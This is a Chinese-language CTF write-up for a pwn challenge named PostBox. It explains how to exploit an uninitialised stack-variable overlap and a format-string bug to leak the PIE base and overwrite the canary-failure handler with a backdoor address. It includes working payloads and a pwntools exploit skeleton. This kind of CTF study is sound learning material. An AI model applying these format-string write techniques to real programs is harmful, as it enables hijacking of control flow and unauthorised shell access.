# PostBox

## 题目简述

程序的“邮箱”交互存在未初始化栈变量复用与格式化字符串漏洞。官方利用先通过大输入污染后续栈帧，再以位置参数 `%n` 修改状态、用 `%p` 泄露 PIE 地址，最后把一个失败处理入口的低两字节改成后门地址，并故意触发栈 canary 检查取得 shell。

仓库没有保留本题源码和 ELF，因而无法给出完整 `checksec`。官方脚本能够证明目标启用了 PIE 和栈 canary，且偏移 `base+0x4028` 对应的失败处理槽可写；这与 Partial RELRO 或其他可写间接调用表相容，但仅凭脚本不能断言其余保护项。

## 解题过程

### 污染重叠栈帧并建立 `%n` 写

选择菜单项 2 后，第一段输入为：

```python
b"A" * 0x2fc + b"\x52\xbf\x01\x00"
```

它利用前后函数栈空间重叠，把原本未初始化、随后会作为格式化参数或状态使用的数据改成攻击者需要的值。官方 WP 没有源码，无法可靠命名被覆盖的变量；能确认的是，后续格式化字符串中的第 49、50 个参数因此成为可用写目标。

接着发送：

```text
%4c%49$n%280c%50$n
```

第一次 `%n` 写入当前输出长度 4；再打印 280 个字符后，第二次写入累计长度 284。该步骤修正程序状态，使后续泄露和再次输入能够继续进行。

### 泄露 PIE 基址

第三次输入使用：

```text
leak_addr:%53$p
```

第 53 个参数泄露模块内地址。官方脚本给出的返回点偏移为 `0x17c3`：

$$
\text{text base}=\text{leak}-0x17c3
$$

随后计算：

```python
check_failed = text_base + 0x4028
backdoor = text_base + 0x177e
```

### 两次 `%hhn` 改写失败处理入口

最终格式化 payload 把两个目标地址作为第 13、14 个参数附在字符串末尾：

```python
payload = (
    b"%23c%13$hhn%103c%14$hhnA"
    + p64(check_failed + 1)
    + p64(check_failed)
)
```

`%23c` 使累计输出长度为 `0x17`，写入 `check_failed+1`；再输出 103 个字符后累计为 `0x7e`，写入 `check_failed`。小端内存中的低两字节因此变成：

```text
低地址 check_failed     = 0x7e
高地址 check_failed + 1 = 0x17
合并结果                = 0x177e
```

目标入口和后门位于同一 PIE 映像，保留高位、只改低两字节即可把间接调用重定向到 `base+0x177e`。

最后发送 281 字节填充破坏栈 canary。函数返回时触发失败处理，而该入口已经指向后门，因此转入后门并输出 `Enjoy`/取得交互 shell。官方脚本最多重连 100 次，说明未初始化栈布局或输入解析可能导致单次利用不稳定；重试是对原语稳定性的补偿，不应被误写成地址爆破。

### 核心交互骨架

```python
io.sendlineafter(b"choice:\n", b"2")
io.sendlineafter(b":\n", b"A" * 0x2fc + b"\x52\xbf\x01\x00")
io.sendlineafter(b":\n", b"%4c%49$n%280c%50$n")
io.sendlineafter(b":\n", b"leak_addr:%53$p")

leak = int(io.recvuntil(b"\n", drop=True), 16)
base = leak - 0x17c3
check_failed = base + 0x4028

payload = (
    b"%23c%13$hhn%103c%14$hhnA"
    + p64(check_failed + 1)
    + p64(check_failed)
)
io.sendlineafter(b":\n", payload)
io.sendlineafter(b":\n", b"A" * 281)
```

## 方法总结

- 核心技巧：利用未初始化栈重叠布置格式化参数，再用 `%p` 泄露 PIE、用两次 `%hhn` 对可写失败处理入口做低两字节重定向。
- 识别信号：程序既有格式化字符串又有 canary 时，不能只考虑直接改返回地址；可写的 `__stack_chk_fail` GOT/失败回调往往能把 canary 变成主动触发后门的跳板。
- 复用要点：所有 `%n` 写值都按“累计已输出字符数”计算；多字节小端写应从高字节和低字节的目标顺序反推，并记录未初始化栈造成的不稳定性。
